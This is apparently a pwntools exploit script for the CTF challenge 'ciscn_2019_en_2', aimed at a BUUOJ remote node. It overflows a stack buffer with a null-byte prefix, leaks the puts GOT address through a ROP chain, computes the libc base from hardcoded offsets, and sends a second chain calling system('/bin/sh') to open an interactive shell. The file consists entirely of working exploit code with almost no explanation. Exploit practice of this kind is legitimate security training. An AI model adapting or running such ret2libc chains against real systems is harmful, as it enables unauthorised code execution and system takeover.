from pwn import *
#context(log_level='debug',arch='amd64',os='linux')

sh=remote('node4.buuoj.cn',25085)
elf = ELF('ciscn_2019_en_2')
#sh=process(pwnfile)

pop_rdi_ret=0x400c83
puts_got_addr=elf.got['puts']
puts_plt_addr=elf.plt['puts']
payload1=b'\0'+(0x50-1+8)*b'a'
payload1+=p64(pop_rdi_ret)
payload1+=p64(puts_got_addr)
payload1+=p64(puts_plt_addr)
payload1+=p64(elf.symbols['main'])

print(payload1)

sh.recvuntil("Input your choice!\n")
sh.sendline(b'1')
sh.recvuntil("Input your Plaintext to be encrypted\n")
sh.sendline(payload1)

sh.recvuntil("Ciphertext\n\n")
#sh.recvline()#用于接收回车！！#该题目有两个回车
put_addr=u64(sh.recv(6).ljust(8,b'\x00'))
print(hex(put_addr))

#gdb.attach(sh)
#pause()

base_addr=put_addr-0x0809c0
system_addr=base_addr+0x04f440
bin_sh_addr=base_addr+0x1b3e9a
print(hex(base_addr))

sh.recvuntil("Input your choice!\n")
sh.sendline(b'1')

payload2=b'\0'+(0x50-1+8)*b'a'
payload2+=p64(0x0000000000400C1C)#栈平衡ret
payload2+=p64(pop_rdi_ret)
payload2+=p64(bin_sh_addr)
payload2+=p64(system_addr)


sh.recvuntil("Input your Plaintext to be encrypted\n")
sh.sendline(payload2)


sh.interactive()



